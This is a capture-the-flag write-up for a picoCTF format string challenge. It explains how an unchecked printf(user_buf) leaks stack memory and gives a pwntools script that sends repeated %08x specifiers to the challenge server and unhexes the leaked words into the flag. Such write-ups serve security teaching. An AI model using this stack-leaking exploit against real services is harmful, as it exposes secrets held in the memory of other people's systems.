After using wget to fetch the vulnerable source code sitting behind the remove 
server at mercury.picoctf.net:53437, I tried compiling it with 
`gcc -o vuln vuln.c` . Interestingly, I saw the following security warning:

```
vuln.c: In function ‘buy_stonks’:
vuln.c:93:2: warning: format not a string literal and no format arguments [-Wformat-security]
   93 |  printf(user_buf);
      |  ^~~~~~
```

This was basically a confirmation that the challenge would involve exploiting
a format string vulnerability.

When you run the `vuln` binary locally/remotely, it'll prompt you twice - once
for the number 1 or 2, then once for an API token. The format string 
vulnerability is located on the second prompt for the API token. I confired this
by passing in a format string "%x" and saw that it would print out a hexadecimal
value like `a014350` . From here, my next goal was to leak out the contents of
the stack. I first tried brute forcing through a range of offsets on the stack
by sending through `%1$s` , `%2$s` and so on, however I couldn't produce any 
meaningful string value this way. I then tried directly leaking out all the
values at the first several stack addresses by sending a long sequence of `%08x`

format specifiers. Some of the byte sequences looked like it could be valid 
ASCII such as 0x70 for 'p', 0x69 for 'i', and so on. This was a strong hint that
led me to try to unhex the leaked stack values which produced the flag.

I wrote the following script to retrieve the flag:

```python
from pwn import *
import re

context.log_level = 'critical'

def solve():
    conn = remote('mercury.picoctf.net', 53437)
    conn.sendline("1".encode())
    output = conn.recvrepeat(1).decode()

    conn.sendline("%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x".encode())
    output = conn.recvrepeat(1).decode()

    # The second line of output will contain the leaked addresses on the stack.
    lines = output.split("\n")
    leaked_stack_data = lines[1]

    # Now, we need to partition the leaked stack data into groups of 8 
    # characters, corresponding to 4 bytes, then reverse those bytes before
    # unhexing them to get the flag in the correct order.
    extracted_text = ""
    for i in range(0, len(leaked_stack_data), 8):
        if i + 8 <= len(leaked_stack_data):
            sub = leaked_stack_data[i : i + 8]
            sub_bytes = [sub[i : i + 2] for i in range(0, len(sub), 2)][::-1]
            
            # Note: decode's errors='ignore' option is handy for skipping 
            #       decoding invalid UTF-8 values.
            extracted_text += unhex("".join(sub_bytes)).decode(errors='ignore')

    pattern = re.compile('(picoCTF\{.*?\})')  # .*? performs a non-greedy match.
    flag = pattern.search(extracted_text)
    print(flag.group(1))

    conn.close()

if __name__ == "__main__":
    solve()
```
